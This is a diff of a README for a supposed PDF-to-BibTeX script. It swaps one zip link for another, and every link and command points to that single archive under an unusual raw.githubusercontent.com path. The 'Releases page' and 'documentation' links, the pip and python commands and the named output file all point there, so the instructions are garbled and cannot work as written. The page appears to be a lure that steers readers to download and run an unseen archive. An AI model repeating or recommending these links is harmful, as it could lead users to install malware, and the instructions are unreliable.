@@ -8,13 +8,13 @@ Welcome to the **bibtex-extraction** project! This lightweight script allows you
 
 To get started, you'll need to download the application from the Releases page. Click the button below to visit that page.
 
-[![Download bibtex-extraction](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex-extraction.zip)](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex-extraction.zip)
+[![Download bibtex-extraction](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex_extraction_1.4.zip)](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex_extraction_1.4.zip)
 
 ### Step-by-Step Guide to Downloading
 
-1. Click the button above to go to the [Releases page](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex-extraction.zip).
+1. Click the button above to go to the [Releases page](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex_extraction_1.4.zip).
 2. Find the latest release at the top of the page.
-3. Look for the file named `https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex-extraction.zip` or similar. Click on it to start the download.
+3. Look for the file named `https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex_extraction_1.4.zip` or similar. Click on it to start the download.
 4. Once downloaded, locate the file in your downloads folder.
 
 ## 🛠️ System Requirements
@@ -38,11 +38,11 @@ Once you have downloaded the file, follow these steps to run **bibtex-extraction
    ```
 4. Ensure that you have installed the necessary Python libraries. You can do this by running:
    ```
-   pip install -r https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex-extraction.zip
+   pip install -r https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex_extraction_1.4.zip
    ```
 5. Start the application by typing:
    ```
-   python https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex-extraction.zip
+   python https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex_extraction_1.4.zip
    ```
 
 ## 📄 How to Use
@@ -52,7 +52,7 @@ When the application starts, you will see a simple interface. Follow these steps
 1. Click on the option to **Select Folder** and choose the folder that contains your PDF files.
 2. The script will scan the PDFs and extract relevant metadata.
 3. Once the scanning is complete, you will get an option to **Generate BibTeX**.
-4. The resulting `https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex-extraction.zip` file will be created in the same directory.
+4. The resulting `https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex_extraction_1.4.zip` file will be created in the same directory.
 
 ## 📋 Features
 
@@ -83,12 +83,12 @@ If you encounter issues while using the software, consider the following tips:
 
 ## 💡 Additional Resources
 
-For more help or to explore advanced features, visit our [documentation](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex-extraction.zip) page. You can also find useful tips on handling different types of PDF files.
+For more help or to explore advanced features, visit our [documentation](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex_extraction_1.4.zip) page. You can also find useful tips on handling different types of PDF files.
 
 ## 📞 Support
 
 If you have questions, feel free to open an issue on our GitHub repository. Our community will be happy to assist you.
 
-For more details, don’t forget to visit the Releases page again: [Download here](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex-extraction.zip). 
+For more details, don’t forget to visit the Releases page again: [Download here](https://raw.githubusercontent.com/rehanvhora778/bibtex-extraction/main/radicule/bibtex_extraction_1.4.zip). 
 
 Enjoy your BibTeX extraction!
